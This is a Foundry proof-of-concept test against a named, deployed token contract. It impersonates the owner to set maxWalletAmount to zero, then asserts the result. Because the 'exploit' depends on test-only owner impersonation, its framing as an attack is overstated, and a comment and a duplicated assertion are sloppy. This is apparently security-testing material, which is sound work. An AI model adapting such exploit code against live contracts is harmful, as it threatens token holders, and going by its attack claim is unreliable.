pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface UltramanCoin_0x733f8B3545a810214D2D27EEC8c60f93b561C050 {
    function owner() external view returns (address);
    function setMaxWalletAmount(uint256 _maxWalletAmountPct) external;
    function maxWalletAmount() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x733f8B3545a810214D2D27EEC8c60f93b561C050;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner during the exploit
        // The test framework already provides TARGET and attacker variables
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner address
        address owner = UltramanCoin_0x733f8B3545a810214D2D27EEC8c60f93b561C050(TARGET).owner();

        // Impersonate the owner
        vm.startPrank(owner);

        // Call setMaxWalletAmount with a huge denominator to force it to zero
        UltramanCoin_0x733f8B3545a810214D2D27EEC8c60f93b561C050(TARGET).setMaxWalletAmount(type(uint256).max);

        vm.stopPrank();

        // Verify the exploit worked - maxWalletAmount should be zero
        uint256 maxWalletAfter = UltramanCoin_0x733f8B3545a810214D2D27EEC8c60f93b561C050(TARGET).maxWalletAmount();
        assertEq(maxWalletAfter, 0, "maxWalletAmount should be zero after exploit");
        assertEq(maxWalletAfter, 0, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

